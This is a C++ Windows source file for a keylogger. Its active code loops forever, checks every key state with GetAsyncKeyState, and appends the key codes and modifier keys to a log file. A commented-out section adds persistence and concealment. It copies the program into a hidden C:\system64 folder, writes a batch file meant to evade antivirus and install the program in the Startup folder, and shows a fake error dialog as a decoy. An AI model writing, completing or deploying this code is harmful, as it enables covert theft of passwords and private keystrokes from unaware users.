#include "./shared.h"

using namespace std;

/*int APIENTRY WinMain(
	HINSTANCE   hInstance,
	HINSTANCE   hPrevInstance,
	LPSTR       lpCmdLine,
	int         nCmdShow  
	)*/
int main(int argc, char **argv){
    //%appdata%/Microsoft\Windows\Start Menu\Programs\Startup
    
    /*	char dir_pl[1024];
    *	GetModuleFileName(NULL, dir_pl, 1024);

    *char buffer[1024];   
    *strcat(buffer,	"\\Microsoft\\Windows\\Start Menu\\\
    			Programs\\Startup\\sys.exe");
  
    CreateDirectory("C:\\system64", NULL);
    SetFileAttributes("C:\\system64",FILE_ATTRIBUTE_HIDDEN);
    CopyFile(dir_pl, "C:\\system64\\sys.exe", FALSE);
	    
    if(strcmp(buffer, dir_pl)){

	//invisible for antiviruses starting bat file
	//GetEnvironmentVariable( "SystemDrive", logfile, 1024);
    	ofstream bat("C:\\system64\\bat.bat");
    	bat<<"@echo off\n";
    	bat<<"copy C:\\system64\\sys.exe \""<<buffer<<"\">nul\n";
    	bat<<"exit>nul";
    	bat.close();

	//"error"
    	MessageBox(NULL, "0x00000007: INVALID_SOFTWARE_INTERRUPT", "ERROR", MB_OK);
    }

    ShellExecute(
		NULL,
		"open",
		"C:\\system64\\bat.bat",
		"\\min",
		NULL,
		NULL
	);*/

	string logfile;	
	if( 1<argc ){	//writing into choosed file
		logfile = argv[1];
	}else{		//writing info standard file
		logfile = "./log.txt";
	}

	/*making date*/
	time_t now = time(0);
	char* dt = ctime(&now);
	ofstream date( logfile, ios::app );
	date<<endl\
	<<"|------------------------------------------"<<endl\
	<<"|"<<dt<<"|------------------------------------------"<<endl\
	<<"|------------------------------------------"<<endl;
	date.close(); 

	/*grubbing keys*/
	while(true){       
		Sleep(512);//timeout
		for(int i=1; i<=256;i++){//checking pressing key
			if(GetAsyncKeyState(i)){
				ofstream fout( logfile, ios::app );
				fout<<i;//writing pressed keys

				if(	GetAsyncKeyState(VK_LSHIFT) ||\
					GetAsyncKeyState(VK_RSHIFT) ||\
					GetAsyncKeyState(VK_SHIFT)
				  ){
					fout<<"|shift";
				}

				if(	GetAsyncKeyState(VK_LCONTROL) ||\
					GetAsyncKeyState(VK_RCONTROL) ||\
					GetAsyncKeyState(VK_CONTROL)
				  ){
					fout<<"|ctrl";
				}

				if(	GetAsyncKeyState(VK_LMENU) ||\
					GetAsyncKeyState(VK_RMENU) ||\
					GetAsyncKeyState(VK_MENU)
				  ){
					fout<<"|alt";
				}

				fout<<endl;
				fout.close();
			}
		}
	}
	
}
